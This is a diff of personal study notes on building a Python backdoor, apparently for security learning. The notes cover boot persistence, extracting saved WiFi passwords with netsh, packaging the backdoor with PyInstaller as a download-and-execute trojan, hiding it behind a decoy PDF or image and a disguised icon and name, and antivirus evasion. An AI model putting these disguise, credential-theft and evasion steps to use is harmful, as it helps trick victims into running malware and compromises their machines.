@@ -1,13 +1,13 @@
-- ## py-backdoor
+## py-backdoor
 	- Initial Execution
-	- ![Screenshot 2024-08-07 002322.png](../assets/Screenshot_2024-08-07_002322_1722970924517_0.png)
+	- ![Screenshot 2024-08-07 002322.png](./assets/Screenshot_2024-08-07_002322_1722970924517_0.png)
 	- Execution after Boot [ Windows-Persistence]
-	- ![Screenshot 2024-08-07 002050.png](../assets/Screenshot_2024-08-07_002050_1722970918144_0.png)
-- ### </>
+	- ![Screenshot 2024-08-07 002050.png](./assets/Screenshot_2024-08-07_002050_1722970918144_0.png)
+### </>
 	- **WiFi-Password Extraction**
 		- To show all networks - `netsh wlan show profile`
 		- To display details of a particular network - `netsh wlan show profile <network name> key=clear`
-- ### Packaging - Download and Execute
+### Packaging - Download and Execute
 	- `Pyinstaller`
 		- `pip install pyinstaller` - convert `.py` to executables
 			- **note:** architecture of the target and the attack machine must be the same for this to work
@@ -43,7 +43,7 @@
 		- The target need an internet connection when running the trojan
 		- Malware files have to be accessible via direct URL
 		-
-- ### Packaging - Combine Dummy w/ Backdoor
+### Packaging - Combine Dummy w/ Backdoor
 	- `pyinstaller --add-data "../dummy/image.png:." --onefile --noconsole backdoor.py -n scheduler.exe`
 		- `--add-file` - `src-file-path:.` ; `:.` tell pyinstaller to keep the front files in the default application temp directory
 		- The code below executes the front files
@@ -54,8 +54,8 @@
 		  ```
 	- **mask executable** with `.ICO`
 		- `pyinstaller --add-data "../dummy/Template.pdf:." --onefile --noconsole backdoor.py -n Template --icon <path-to-ico-file>`
-		- ![image.png](../assets/image_1722969936363_0.png)
-- ### AV-Evasion
+		- ![image.png](./assets/image_1722969936363_0.png)
+### AV-Evasion
 	- Detection Mechanisms
 		- Signature-based bypass measures
 			- useless operations - loops, arithmetic etc.
